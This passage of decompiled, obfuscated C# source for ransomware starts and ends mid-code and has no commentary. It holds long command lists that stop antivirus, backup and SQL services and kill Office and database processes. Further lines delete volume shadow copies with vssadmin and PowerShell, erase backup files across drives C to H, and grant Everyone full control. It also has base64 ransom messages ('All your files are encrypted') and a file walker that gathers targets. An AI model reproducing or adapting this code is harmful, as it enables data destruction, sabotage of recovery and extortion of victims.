                else if (cTttKvwFnmpq.f000044.ToLower().EndsWith(str))
                {
                  if (GhAMvbuoccW.f000014 == "NO")
                  {
                    try
                    {
                      c000013.ybntlhJHhisLb(p3: cTttKvwFnmpq.f000044);
                    }
                    catch (Exception ex)
                    {
                    }
                  }
                }
              }
              fileStream4.Dispose();
            }
            if (start1 == null)
              start1 = new ThreadStart(cTttKvwFnmpq.m00001d);
            new Thread(start1)
            {
              Priority = ThreadPriority.Normal,
              IsBackground = true
            }.Start();
            if (!cTttKvwFnmpq.eedfnXcwSQkQNFbIx.EndsWith(".part"))
              return;
            System.IO.File.Move(cTttKvwFnmpq.eedfnXcwSQkQNFbIx, cTttKvwFnmpq.eedfnXcwSQkQNFbIx.Replace(".part", ""));
          }
          else
          {
            if (start2 == null)
              start2 = new ThreadStart(cTttKvwFnmpq.m00001e);
            new Thread(start2)
            {
              Priority = ThreadPriority.Normal,
              IsBackground = true
            }.Start();
          }
        }
        catch (Exception ex)
        {
        }
      }
      catch (Exception ex1)
      {
        if (!GhAMvbuoccW.CCDyMIHlAe)
          return;
        try
        {
          System.IO.File.AppendAllText(GhAMvbuoccW.f000025, "File: " + cTttKvwFnmpq.f000044 + " - Error while fully writing to file: " + ex1.Message + "\r\n");
        }
        catch (Exception ex2)
        {
        }
      }
    }

    private static void m00000c()
    {
      List<string> vfIruRdoHw = GhAMvbuoccW.VfIRuRDoHW;
      if (GhAMvbuoccW.f000032 == null)
        GhAMvbuoccW.f000032 = new Action<string>(GhAMvbuoccW.m00000d);
      Action<string> f000032 = GhAMvbuoccW.f000032;
      Parallel.ForEach<string>((IEnumerable<string>) vfIruRdoHw, f000032);
      List<string> zsmEaXfyFht = GhAMvbuoccW.ZSMEaXFyFht;
      if (GhAMvbuoccW.f000033 == null)
        GhAMvbuoccW.f000033 = new Action<string>(GhAMvbuoccW.m00000e);
      Action<string> f000033 = GhAMvbuoccW.f000033;
      Parallel.ForEach<string>((IEnumerable<string>) zsmEaXfyFht, f000033);
      if (GhAMvbuoccW.f000022 == "YES")
      {
        string[] yacSoacXjaCuc = GhAMvbuoccW.YacSoacXjaCUC;
        if (GhAMvbuoccW.f000034 == null)
          GhAMvbuoccW.f000034 = new Action<string>(GhAMvbuoccW.m00000f);
        Action<string> f000034 = GhAMvbuoccW.f000034;
        Parallel.ForEach<string>((IEnumerable<string>) yacSoacXjaCuc, f000034);
      }
      if (!"Windows 8".Contains("XP"))
      {
        GhAMvbuoccW.wDQhPDGrMto(GhAMvbuoccW.edpjkmWiBB);
      }
      else
      {
        List<string> f00000a = GhAMvbuoccW.f00000a;
        if (GhAMvbuoccW.f000035 == null)
          GhAMvbuoccW.f000035 = new Action<string>(GhAMvbuoccW.m000010);
        Action<string> f000035 = GhAMvbuoccW.f000035;
        Parallel.ForEach<string>((IEnumerable<string>) f00000a, f000035);
      }
      List<string> pmzwKqsyDlmmF = GhAMvbuoccW.pmzwKqsyDlmmF;
      if (GhAMvbuoccW.f000036 == null)
        GhAMvbuoccW.f000036 = new Action<string>(GhAMvbuoccW.m000011);
      Action<string> f000036 = GhAMvbuoccW.f000036;
      Parallel.ForEach<string>((IEnumerable<string>) pmzwKqsyDlmmF, f000036);
    }

    private static void m00000d(string p0) => GhAMvbuoccW.m000002("sc.exe", p0);

    private static void m00000e(string p0) => GhAMvbuoccW.m000002("taskkill.exe", p0);

    private static void m00000f(string p0) => GhAMvbuoccW.m000002("taskkill.exe", "/IM " + p0 + " /f");

    private static void m000010(string p0) => GhAMvbuoccW.m000002("vssadmin.exe", p0);

    private static void m000011(string p0) => GhAMvbuoccW.m000002("del.exe", p0);

    static GhAMvbuoccW()
    {
      SmartAssembly.HouseOfCards.Strings.CreateGetStringDelegate(typeof (GhAMvbuoccW));
      GhAMvbuoccW.gheRqfduEuJ = "EVET";
      GhAMvbuoccW.bGfpmpYMCsNkyjcK = (byte[]) null;
      GhAMvbuoccW.HirTGWkSHczrmbY = "NO";
      GhAMvbuoccW.nsiwXjKpMUO = "100000000";
      GhAMvbuoccW.ZmKssmQIdPi = new List<string>();
      GhAMvbuoccW.f000001 = new List<string>();
      GhAMvbuoccW.zMQimCitOD = "NO";
      GhAMvbuoccW.f000002 = "";
      GhAMvbuoccW.f000003 = "";
      GhAMvbuoccW.EXVykcHaTCNay = "";
      GhAMvbuoccW.szjPprKwdybiP = "NO";
      GhAMvbuoccW.IwCCvRldil = 0;
      GhAMvbuoccW.BBqvZtJMKtZyzF = "NO";
      GhAMvbuoccW.MkWPFkyuHrLz = "NO";
      GhAMvbuoccW.tGBTkHzktdbqpsN = "NO";
      GhAMvbuoccW.IHkGIfOFsBs = "0";
      GhAMvbuoccW.PktefsOLxgM = "NO";
      GhAMvbuoccW.lvMwbEyyvL = "NO";
      GhAMvbuoccW.f000004 = "NO";
      GhAMvbuoccW.f000005 = "NO";
      GhAMvbuoccW.FBdBqWxFZQgyhcDd = new List<string>()
      {
        "lsass.exe",
        "svchst.exe",
        "crcss.exe",
        "chrome32.exe",
        "firefox.exe",
        "calc.exe",
        "mysqld.exe",
        "dllhst.exe",
        "opera32.exe",
        "memop.exe",
        "spoolcv.exe",
        "ctfmom.exe",
        "SkypeApp.exe"
      };
      GhAMvbuoccW.HMEbcaxMfcYzgl = new List<string>();
      GhAMvbuoccW.wbKIZmscSBasobt = "YES";
      GhAMvbuoccW.dVUrkAuvmqKS = "NO";
      GhAMvbuoccW.uSiPWDmilru = "NO";
      GhAMvbuoccW.f000006 = new List<string>();
      GhAMvbuoccW.f000007 = "NO";
      GhAMvbuoccW.f000008 = "8a3cd836-e8bb-428d-9e0b-d62e18cfe2d4";
      GhAMvbuoccW.rmNaxrdaErS = "YES";
      GhAMvbuoccW.nnUkiNRMVi = "YES";
      GhAMvbuoccW.f000009 = new List<string>()
      {
        "start Dnscache /y",
        "start FDResPub /y",
        "start SSDPSRV /y",
        "start upnphost /y",
        "stop avpsus /y",
        "stop McAfeeDLPAgentService /y",
        "stop mfewc /y",
        "stop BMR Boot Service /y",
        "stop NetBackup BMR MTFTP Service /y",
        "stop DefWatch /y",
        "stop ccEvtMgr /y",
        "stop ccSetMgr /y",
        "stop SavRoam /y",
        "stop RTVscan /y",
        "stop QBFCService /y",
        "stop QBIDPService /y",
        "stop Intuit.QuickBooks.FCS /y",
        "stop QBCFMonitorService /y",
        "stop YooBackup /y",
        "stop YooIT /y",
        "stop zhudongfangyu /y",
        "stop stc_raw_agent /y",
        "stop VSNAPVSS /y",
        "stop VeeamTransportSvc /y",
        "stop VeeamDeploymentService /y",
        "stop VeeamNFSSvc /y",
        "stop veeam /y",
        "stop PDVFSService /y",
        "stop BackupExecVSSProvider /y",
        "stop BackupExecAgentAccelerator /y",
        "stop BackupExecAgentBrowser /y",
        "stop BackupExecDiveciMediaService /y",
        "stop BackupExecJobEngine /y",
        "stop BackupExecManagementService /y",
        "stop BackupExecRPCService /y",
        "stop AcrSch2Svc /y",
        "stop AcronisAgent /y",
        "stop CASAD2DWebSvc /y",
        "stop CAARCUpdateSvc /y",
        "stop sophos /y",
        "stop “Acronis VSS Provider” /y",
        "stop MsDtsServer /y",
        "stop IISAdmin /y",
        "stop MSExchangeES /y",
        "stop “Sophos Agent” /y",
        "stop EraserSvc11710 /y",
        "stop “Enterprise Client Service” /y",
        "stop “SQL Backups /y",
        "stop MsDtsServer100 /y",
        "stop NetMsmqActivator /y",
        "stop MSExchangeIS /y",
        "stop “Sophos AutoUpdate Service” /y",
        "stop SamSs /y",
        "stop ReportServer /y",
        "stop “SQLsafe Backup Service” /y",
        "stop MsDtsServer110 /y",
        "stop POP3Svc /y",
        "stop MSExchangeMGMT /y",
        "stop “Sophos Clean Service” /y",
        "stop SMTPSvc /y",
        "stop ReportServer$SQL_2008 /y",
        "stop “SQLsafe Filter Service” /y",
        "stop msftesql$PROD /y",
        "stop SstpSvc /y",
        "stop MSExchangeMTA /y",
        "stop “Sophos Device Control Service” /y",
        "stop ReportServer$SYSTEM_BGC /y",
        "stop “Symantec System Recovery” /y",
        "stop MSOLAP$SQL_2008 /y",
        "stop UI0Detect /y",
        "stop MSExchangeSA /y",
        "stop “Sophos File Scanner Service” /y",
        "stop ReportServer$TPS /y",
        "stop “Veeam Backup Catalog Data Service” /y",
        "stop MSOLAP$SYSTEM_BGC /y",
        "stop W3Svc /y",
        "stop MSExchangeSRS /y",
        "stop “Sophos Health Service” /y",
        "stop ReportServer$TPSAMA /y",
        "stop “Zoolz 2 Service” /y",
        "stop MSOLAP$TPS /y",
        "stop “aphidmonitorservice” /y",
        "stop msexchangeadtopology /y",
        "stop “Sophos MCS Agent” /y",
        "stop AcrSch2Svc /y",
        "stop MSOLAP$TPSAMA /y",
        "stop “intel(r) proset monitoring service” /y",
        "stop msexchangeimap4 /y",
        "stop “Sophos MCS Client” /y",
        "stop ARSM /y",
        "stop MSSQL$BKUPEXEC /y",
        "stop unistoresvc_1af40a /y",
        "stop “Sophos Message Router” /y",
        "stop BackupExecAgentAccelerator /y",
        "stop MSSQL$ECWDB2 /y",
        "stop audioendpointbuilder /y",
        "stop “Sophos Safestore Service” /y",
        "stop BackupExecAgentBrowser /y",
        "stop MSSQL$PRACTICEMGT /y",
        "stop “Sophos System Protection Service” /y",
        "stop BackupExecDeviceMediaService /y",
        "stop MSSQL$PRACTTICEBGC /y",
        "stop “Sophos Web Control Service” /y",
        "stop BackupExecJobEngine /y",
        "stop MSSQL$PROD /y",
        "stop AcronisAgent /y",
        "stop BackupExecManagementService /y",
        "stop MSSQL$PROFXENGAGEMENT /y",
        "stop Antivirus /y",
        "stop BackupExecRPCService /y",
        "stop MSSQL$SBSMONITORING /",
        "stop MSSQL$SBSMONITORING /y",
        "stop AVP /y",
        "stop BackupExecVSSProvider /y",
        "stop MSSQL$SHAREPOINT /y",
        "stop DCAgent /y",
        "stop bedbg /y",
        "stop MSSQL$SQL_2008 /y",
        "stop EhttpSrv /y",
        "stop MMS /y",
        "stop MSSQL$SQLEXPRESS /y",
        "stop ekrn /y",
        "stop mozyprobackup /y",
        "stop MSSQL$SYSTEM_BGC /y",
        "stop EPSecurityService /y",
        "stop MSSQL$VEEAMSQL2008R2 /y",
        "stop MSSQL$TPS /y",
        "stop EPUpdateService /y",
        "stop ntrtscan /y",
        "stop MSSQL$TPSAMA /y",
        "stop EsgShKernel /y",
        "stop PDVFSService /y",
        "stop MSSQL$VEEAMSQL2008R2 /y",
        "stop ESHASRV /y",
        "stop SDRSVC /y",
        "stop MSSQL$VEEAMSQL2012 /y",
        "stop FA_Scheduler /y",
        "stop SQLAgent$VEEAMSQL2008R2 /y",
        "stop MSSQLFDLauncher$PROFXENGAGEMENT /y",
        "stop KAVFS /y",
        "stop SQLWriter /y",
        "stop MSSQLFDLauncher$SBSMONITORING /y",
        "stop KAVFSGT /y",
        "stop VeeamBackupSvc /y",
        "stop MSSQLFDLauncher$SHAREPOINT /y",
        "stop kavfsslp /y",
        "stop VeeamBrokerSvc /y",
        "stop MSSQLFDLauncher$SQL_2008 /y",
        "stop klnagent /y",
        "stop VeeamCatalogSvc /y",
        "stop MSSQLFDLauncher$SYSTEM_BGC /y",
        "stop macmnsvc /y",
        "stop VeeamCloudSvc /y",
        "stop MSSQLFDLauncher$TPS /y",
        "stop masvc /y",
        "stop VeeamDeploymentService /y",
        "stop MSSQLFDLauncher$TPSAMA /y",
        "stop MBAMService /y",
        "stop VeeamDeploySvc /y",
        "stop MSSQLSERVER /y",
        "stop MBEndpointAgent /y",
        "stop VeeamEnterpriseManagerSvc /y",
        "stop MSSQLServerADHelper /y",
        "stop McAfeeEngineService /y",
        "stop VeeamHvIntegrationSvc /y",
        "stop MSSQLServerADHelper100 /y",
        "stop McAfeeFramework /y",
        "stop VeeamMountSvc /y",
        "stop MSSQLServerOLAPService /y",
        "stop McAfeeFrameworkMcAfeeFramework /y",
        "stop VeeamNFSSvc /y",
        "stop MySQL57 /y",
        "stop McShield /y",
        "stop VeeamRESTSvc /y",
        "stop MySQL80 /y",
        "stop McTaskManager /y",
        "stop VeeamTransportSvc /y",
        "stop OracleClientCache80 /y",
        "stop mfefire /y",
        "stop wbengine /y",
        "stop ReportServer$SQL_2008 /y",
        "stop mfemms /y",
        "stop wbengine /y",
        "stop RESvc /y",
        "stop mfevtp /y",
        "stop sms_site_sql_backup /y",
        "stop SQLAgent$BKUPEXEC /y",
        "stop MSSQL$SOPHOS /y",
        "stop SQLAgent$CITRIX_METAFRAME /y",
        "stop sacsvr /y",
        "stop SQLAgent$CXDB /y",
        "stop SAVAdminService /y",
        "stop SQLAgent$ECWDB2 /y",
        "stop SAVService /y",
        "stop SQLAgent$PRACTTICEBGC /y",
        "stop SepMasterService /y",
        "stop SQLAgent$PRACTTICEMGT /y",
        "stop ShMonitor /y",
        "stop SQLAgent$PROD /y",
        "stop Smcinst /y",
        "stop SQLAgent$PROFXENGAGEMENT /y",
        "stop SmcService /y",
        "stop SQLAgent$SBSMONITORING /y",
        "stop SntpService /y",
        "stop SQLAgent$SHAREPOINT /y",
        "stop sophossps /y",
        "stop SQLAgent$SQL_2008 /y",
        "stop SQLAgent$SOPHOS /y",
        "stop SQLAgent$SQLEXPRESS /y",
        "stop svcGenericHost /y",
        "stop SQLAgent$SYSTEM_BGC /y",
        "stop swi_filter /y",
        "stop SQLAgent$TPS /y",
        "stop swi_service /y",
        "stop SQLAgent$TPSAMA /y",
        "stop swi_update /y",
        "stop SQLAgent$VEEAMSQL2008R2 /y",
        "stop swi_update_64 /y",
        "stop SQLAgent$VEEAMSQL2012 /y",
        "stop TmCCSF /y",
        "stop SQLBrowser /y",
        "stop tmlisten /y",
        "stop SQLSafeOLRService /y",
        "stop TrueKey /y",
        "stop SQLSERVERAGENT /y",
        "stop TrueKeyScheduler /y",
        "stop SQLTELEMETRY /y",
        "stop TrueKeyServiceHelper /y",
        "stop SQLTELEMETRY$ECWDB2 /y",
        "stop WRSVC /y",
        "stop mssql$vim_sqlexp /y",
        "stop vapiendpoint /y"
      };
      GhAMvbuoccW.VfIRuRDoHW = new List<string>()
      {
        "config Dnscache start= auto",
        "config FDResPub start= auto",
        "config SSDPSRV start= auto",
        "config upnphost start= auto",
        "config SQLTELEMETRY start= disabled",
        "config SQLTELEMETRY$ECWDB2 start= disabled",
        "config SQLWriter start= disabled",
        "config SstpSvc start= disabled"
      };
      GhAMvbuoccW.ZSMEaXFyFht = new List<string>()
      {
        "/IM mspub.exe /F",
        "/IM mydesktopqos.exe /F",
        "/IM mydesktopservice.exe /F",
        "/IM mysqld.exe /F",
        "/IM sqbcoreservice.exe /F",
        "/IM firefoxconfig.exe /F",
        "/IM agntsvc.exe /F",
        "/IM thebat.exe /F",
        "/IM steam.exe /F",
        "/IM encsvc.exe /F",
        "/IM excel.exe /F",
        "/IM CNTAoSMgr.exe /F",
        "/IM sqlwriter.exe /F",
        "/IM tbirdconfig.exe /F",
        "/IM dbeng50.exe /F",
        "/IM thebat64.exe /F",
        "/IM ocomm.exe /F",
        "/IM infopath.exe /F",
        "/IM mbamtray.exe /F",
        "/IM zoolz.exe /F",
        "IM thunderbird.exe /F",
        "/IM dbsnmp.exe /F",
        "/IM xfssvccon.exe /F",
        "/IM mspub.exe /F",
        "/IM Ntrtscan.exe /F",
        "/IM isqlplussvc.exe /F",
        "/IM onenote.exe /F",
        "/IM PccNTMon.exe /F",
        "/IM msaccess.exe /F",
        "/IM outlook.exe /F",
        "/IM tmlisten.exe /F",
        "/IM msftesql.exe /F",
        "/IM powerpnt.exe /F",
        "/IM mydesktopqos.exe /F",
        "/IM visio.exe /F",
        "/IM mydesktopservice.exe /F",
        "/IM winword.exe /F",
        "/IM mysqld-nt.exe /F",
        "/IM wordpad.exe /F",
        "/IM mysqld-opt.exe /F",
        "/IM ocautoupds.exe /F",
        "/IM ocssd.exe /F",
        "/IM oracle.exe /F",
        "/IM sqlagent.exe /F",
        "/IM sqlbrowser.exe /F",
        "/IM sqlservr.exe /F",
        "/IM synctime.exe /F"
      };
      GhAMvbuoccW.f00000a = new List<string>()
      {
        "Delete Shadows /all /quiet",
        "resize shadowstorage /for=c: /on=c: /maxsize=401MB",
        "resize shadowstorage /for=c: /on=c: /maxsize=unbounded",
        "resize shadowstorage /for=d: /on=d: /maxsize=401MB",
        "resize shadowstorage /for=d: /on=d: /maxsize=unbounded",
        "resize shadowstorage /for=e: /on=e: /maxsize=401MB",
        "resize shadowstorage /for=e: /on=e: /maxsize=unbounded",
        "resize shadowstorage /for=f: /on=f: /maxsize=401MB",
        "resize shadowstorage /for=f: /on=f: /maxsize=unbounded",
        "resize shadowstorage /for=g: /on=g: /maxsize=401MB",
        "resize shadowstorage /for=g: /on=g: /maxsize=unbounded",
        "resize shadowstorage /for=h: /on=h: /maxsize=401MB",
        "resize shadowstorage /for=h: /on=h: /maxsize=unbounded",
        "Delete Shadows /all /quiet"
      };
      GhAMvbuoccW.edpjkmWiBB = "Get-WmiObject Win32_Shadowcopy | ForEach-Object { $_Delete(); }";
      GhAMvbuoccW.pmzwKqsyDlmmF = new List<string>()
      {
        "/s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk",
        "/s /f /q d:\\*.VHD d:\\*.bac d:\\*.bak d:\\*.wbcat d:\\*.bkf d:\\Backup*.* d:\\backup*.* d:\\*.set d:\\*.win d:\\*.dsk",
        "/s /f /q e:\\*.VHD e:\\*.bac e:\\*.bak e:\\*.wbcat e:\\*.bkf e:\\Backup*.* e:\\backup*.* e:\\*.set e:\\*.win e:\\*.dsk",
        "/s /f /q f:\\*.VHD f:\\*.bac f:\\*.bak f:\\*.wbcat f:\\*.bkf f:\\Backup*.* f:\\backup*.* f:\\*.set f:\\*.win f:\\*.dsk",
        "/s /f /q g:\\*.VHD g:\\*.bac g:\\*.bak g:\\*.wbcat g:\\*.bkf g:\\Backup*.* g:\\backup*.* g:\\*.set g:\\*.win g:\\*.dsk",
        "/s /f /q h:\\*.VHD h:\\*.bac h:\\*.bak h:\\*.wbcat h:\\*.bkf h:\\Backup*.* h:\\backup*.* h:\\*.set h:\\*.win h:\\*.dsk"
      };
      GhAMvbuoccW.f00000b = new List<string>()
      {
        "\"C:*\" /grant Everyone:F /T /C /Q",
        "\"D:*\" /grant Everyone:F /T /C /Q",
        "\"Z:*\" /grant Everyone:F /T /C /Q"
      };
      GhAMvbuoccW.aYqzBWQifeA = "NO";
      GhAMvbuoccW.f00000c = "NO";
      GhAMvbuoccW.f00000d = new DateTime(2000, 1, 1);
      GhAMvbuoccW.f00000e = new DateTime(2100, 1, 1);
      GhAMvbuoccW.f00000f = "YES";
      GhAMvbuoccW.f000010 = "10";
      GhAMvbuoccW.f000011 = "NO";
      GhAMvbuoccW.fNMfifGmoXya = "NO";
      GhAMvbuoccW.rPQFiVwCriY = "NO";
      GhAMvbuoccW.yrIyoHrzWDCT = "YES";
      GhAMvbuoccW.NwrSvcEHBCxFfoz = "NO";
      GhAMvbuoccW.f000012 = "NO";
      GhAMvbuoccW.f000013 = new List<string>()
      {
        "docx",
        "pdf",
        "xlsx",
        "csv"
      };
      GhAMvbuoccW.f000014 = "NO";
      GhAMvbuoccW.f000015 = "1";
      GhAMvbuoccW.MSbkqSPZNmrgShe = "NO";
      GhAMvbuoccW.f000016 = "NO";
      GhAMvbuoccW.f000017 = "NO";
      GhAMvbuoccW.fKcZCslCfAJPz = string.Empty;
      GhAMvbuoccW.KWarveAlrUeLj = "NO";
      GhAMvbuoccW.CvhuRhPbSX = "YES";
      GhAMvbuoccW.f000018 = "YES";
      GhAMvbuoccW.f000019 = "QWxsIHlvdXIgZmlsZXMgYXJlIGVuY3J5cHRlZCAhIQ==";
      GhAMvbuoccW.EiyrcFiAoaX = "UkVBRCAiUkVTVE9SRV9USEVNLnR4dCIgRklMRSAh";
      GhAMvbuoccW.f00001a = "NO";
      GhAMvbuoccW.SbkfEriDLMxWh = "NO";
      GhAMvbuoccW.f00001b = "NO";
      GhAMvbuoccW.NMKbJRePeNuLz = "NO";
      GhAMvbuoccW.OIjqWZRpNdE = "NO";
      GhAMvbuoccW.f00001c = "LOGONISOFF";
      GhAMvbuoccW.f00001d = "NO";
      GhAMvbuoccW.XoculucrhuBC = "NO";
      GhAMvbuoccW.RoiBxbbYOpTnzdF = "reload1.lnk";
      GhAMvbuoccW.f00001e = "NO";
      GhAMvbuoccW.f00001f = "NO";
      GhAMvbuoccW.cuUuUUMpmxH = "NO";
      GhAMvbuoccW.f000020 = "NO";
      GhAMvbuoccW.nmjDhIwEGnMOrO = "VGhhbm9z";
      GhAMvbuoccW.aYrdlpstiAwAZTu = "YES";
      GhAMvbuoccW.nqNdPWHffReq = "YES";
      GhAMvbuoccW.f000021 = "NO";
      GhAMvbuoccW.f000022 = "NO";
      GhAMvbuoccW.YacSoacXjaCUC = new string[0];
      GhAMvbuoccW.QtTrkEhpkGUJgMO = "YES";
      GhAMvbuoccW.uBIPmjbCjNt = true;
      GhAMvbuoccW.f000023 = "YES";
      GhAMvbuoccW.PAOJgADrbjEa = true;
      GhAMvbuoccW.hxCcwpobkJC = false;
      GhAMvbuoccW.FRIhZgoxuuhF = false;
      GhAMvbuoccW.f000024 = false;
      GhAMvbuoccW.f000025 = "Debug_Log.txt";
      GhAMvbuoccW.CCDyMIHlAe = false;
      GhAMvbuoccW.f000026 = false;
      GhAMvbuoccW.f000027 = false;
      GhAMvbuoccW.f000028 = false;
      GhAMvbuoccW.UOlZmEwYRBbnfmvt = true;
      GhAMvbuoccW.muQSQoYNOwJp = "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + "" + ".txt";
      GhAMvbuoccW.f000029 = true;
      GhAMvbuoccW.lBGXxmsJjqv = new Stopwatch();
      GhAMvbuoccW.f00002a = 0;
      GhAMvbuoccW.f00002b = 0;
      GhAMvbuoccW.YazilaoopZ = false;
      GhAMvbuoccW.f00002c = ".[ID-]";
      GhAMvbuoccW.caYhozbaifo = new string[1]
      {
        "\"db\",\"dbf\",\"accdb\",\"dbx\",\"mdb\",\"mdf\",\"epf\",\"ndf\",\"ldf\",\"1cd\",\"sdf\",\"nsf\",\"fp7\",\"cat\",\"log\""
      };
      GhAMvbuoccW.KlnqoelvmWHjj = new List<string>();
      GhAMvbuoccW.f00002d = 0;
      GhAMvbuoccW.RaNDyCdUClri = true;
      GhAMvbuoccW.f00002e = false;
      GhAMvbuoccW.CoyMCdqKPDBfCk = false;
      GhAMvbuoccW.f00002f = false;
      GhAMvbuoccW.f000030 = false;
    }

    public sealed class c000003
    {
      private static StringCollection YkLwhicznNAwtvOO;
      private static List<string> hFeyBiheGelkT;
      [NonSerialized]
      internal static GetString f000038;

      public static List<string> SearchFiles(string p0)
      {
        List<string> stringList = new List<string>();
        return GhAMvbuoccW.c000003.WalkDirectoryTree(p0);
      }

      private static List<string> WalkDirectoryTree(string p0)
      {
        string[] strArray = (string[]) null;
        try
        {
          strArray = Directory.GetFiles(p0, "*.*");
        }
        catch (Exception ex)
        {
        }
        if (strArray != null)
        {
          foreach (string path in strArray)
          {
            try
            {
              if (path.ToLower().Contains("program files") || path.ToLower().Contains("windows") || path.ToLower().Contains("perflogs") || path.ToLower().Contains("internet explorer") || path.ToLower().Contains("programdata") || path.ToLower().Contains("appdata") || path.ToLower().Contains("autoexec.bat") || path.ToLower().Contains("desktop.ini") || path.ToLower().Contains("autorun.inf") || path.ToLower().Contains("ntuser.dat") || path.ToLower().Contains("iconcache.db") || path.ToLower().Contains("bootsect.bak") || path.ToLower().Contains("boot.ini") || path.ToLower().Contains("ntuser.dat.log") || path.ToLower().Contains("thumbs.db") || path.ToLower().Contains("bootmgr") || path.ToLower().Contains("pagefile.sys") || path.ToLower().Contains("config.sys") || path.ToLower().Contains("ntuser.ini") || path.Contains("Builder_Log") || path.Contains("RSAKeys") || path.Contains("RESTORE_FILES_INFO") || path.EndsWith(".NARUMI") || path.EndsWith("exe") || path.EndsWith("dll") || path.EndsWith("EXE") || path.EndsWith("DLL") || path.ToLower().Contains("Recycle.Bin") || path.ToLower().Contains(GhAMvbuoccW.RoiBxbbYOpTnzdF))
              {
                if (!path.Contains("Microsoft SQL Server"))
                  continue;
              }
              if (System.IO.File.Exists(path) && (double) path.Length <= double.Parse(GhAMvbuoccW.nsiwXjKpMUO) * 1024.0 * 1024.0 && GhAMvbuoccW.HirTGWkSHczrmbY == "YES")
                GhAMvbuoccW.c000003.hFeyBiheGelkT.Add(path);
              else if (System.IO.File.Exists(path))
              {
                if (GhAMvbuoccW.HirTGWkSHczrmbY == "NO")
                  GhAMvbuoccW.c000003.hFeyBiheGelkT.Add(path);
              }
            }
            catch (Exception ex)
            {
            }
          }
          foreach (string directory in Directory.GetDirectories(p0))
            GhAMvbuoccW.c000003.WalkDirectoryTree(directory);
        }
        return GhAMvbuoccW.c000003.hFeyBiheGelkT;
      }

      static c000003()
      {
        SmartAssembly.HouseOfCards.Strings.CreateGetStringDelegate(typeof (GhAMvbuoccW.c000003));
        GhAMvbuoccW.c000003.YkLwhicznNAwtvOO = new StringCollection();
        GhAMvbuoccW.c000003.hFeyBiheGelkT = new List<string>();
      }
    }

    private sealed class c000004
    {
      public string avfxhzATpymbWL;

      public bool m000012(Process p0) => p0.ProcessName == this.avfxhzATpymbWL;
    }

    private sealed class NxIyepnTFBO
    {
      public string nvRebewysN;

      public bool m000013(DriveInfo p0) => p0.RootDirectory.Name == this.nvRebewysN;
    }

    private sealed class MCSuzJljyGwrZ
    {
      public string[] f000039;
      public string[] CToRljeBfHM;
      public string hSfGYaylYziGu;
      public string f00003a;
      [NonSerialized]
      internal static GetString f00003b;

      public void m000014(string p0)
      {
        ThreadStart start1 = (ThreadStart) null;
        ThreadStart start2 = (ThreadStart) null;
        GhAMvbuoccW.MCSuzJljyGwrZ.uILPrdIBlgQjre uIlPrdIblgQjre = new GhAMvbuoccW.MCSuzJljyGwrZ.uILPrdIBlgQjre();
        uIlPrdIblgQjre.f00003c = this;
        uIlPrdIblgQjre.f00003d = p0;
        if (GhAMvbuoccW.f000028 && !"Windows 8".Contains("XP") && !"Windows 8".Contains("Windows 7"))
        {
          if (start1 == null)
            start1 = new ThreadStart(uIlPrdIblgQjre.m000015);
          new Thread(start1)
          {
            Priority = ThreadPriority.Normal,
            IsBackground = true
          }.Start();
        }
        if (GhAMvbuoccW.rmNaxrdaErS == "YES")
        {
          if (start2 == null)
            start2 = new ThreadStart(uIlPrdIblgQjre.m000016);
          Thread thread = new Thread(start2);
          thread.Priority = ThreadPriority.Normal;
          thread.IsBackground = false;
          thread.Start();
          thread.Join();
        }
        else
          GhAMvbuoccW.uBTjgvutOlsTJ(uIlPrdIblgQjre.f00003d, this.f000039, this.f00003a, this.CToRljeBfHM, this.hSfGYaylYziGu);
      }

      static MCSuzJljyGwrZ() => SmartAssembly.HouseOfCards.Strings.CreateGetStringDelegate(typeof (GhAMvbuoccW.MCSuzJljyGwrZ));

      private sealed class uILPrdIBlgQjre
      {
        public GhAMvbuoccW.MCSuzJljyGwrZ f00003c;
        public string f00003d;

        public void m000015()
        {
          if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            return;
          GhAMvbuoccW.sMlBAtMqAgeMq(WindowsIdentity.GetCurrent().Name, this.f00003d);
        }

        public void m000016() => GhAMvbuoccW.uBTjgvutOlsTJ(this.f00003d, this.f00003c.f000039, this.f00003c.f00003a, this.f00003c.CToRljeBfHM, this.f00003c.hSfGYaylYziGu);
      }
    }

    private sealed class mDsrdwsfBAgqx
    {
      public List<string> MWjzSWdUTiapH;
      public List<string> vJUzSMoRbycwzG;
      public string f00003e;
      public string[] nBTsxqqCcIrA;
      public string f000002;
      [NonSerialized]
      internal static GetString f00003f;

      public void m000017(string p0)
      {
        foreach (string str1 in this.vJUzSMoRbycwzG)
        {
          ThreadStart start1 = (ThreadStart) null;
          GhAMvbuoccW.mDsrdwsfBAgqx.bKLeOnnwOsJw bKleOnnwOsJw = new GhAMvbuoccW.mDsrdwsfBAgqx.bKLeOnnwOsJw();
          bKleOnnwOsJw.irnVJvnuIedJmu = this;
          bKleOnnwOsJw.ldrdWbhdALtRA = str1;
          if ((!bKleOnnwOsJw.ldrdWbhdALtRA.Contains("C:\\Program Files\\") && !bKleOnnwOsJw.ldrdWbhdALtRA.Contains("C:\\Program Files (x86)\\") && !bKleOnnwOsJw.ldrdWbhdALtRA.Contains(":\\Windows\\") && !bKleOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("perflogs") && !bKleOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("internet explorer") && !bKleOnnwOsJw.ldrdWbhdALtRA.Contains(":\\ProgramData\\") && !bKleOnnwOsJw.ldrdWbhdALtRA.Contains("\\AppData\\") && !bKleOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("msocache") && !bKleOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("system volume information") && !bKleOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("boot") && !bKleOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("tor browser") && !bKleOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("mozilla") && !bKleOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("google chrome") && !bKleOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("application data") || bKleOnnwOsJw.ldrdWbhdALtRA.Contains("Microsoft SQL Server")) && !bKleOnnwOsJw.ldrdWbhdALtRA.Contains("autoexec.bat") && !bKleOnnwOsJw.ldrdWbhdALtRA.Contains("desktop.ini") && !bKleOnnwOsJw.ldrdWbhdALtRA.Contains("autorun.inf") && 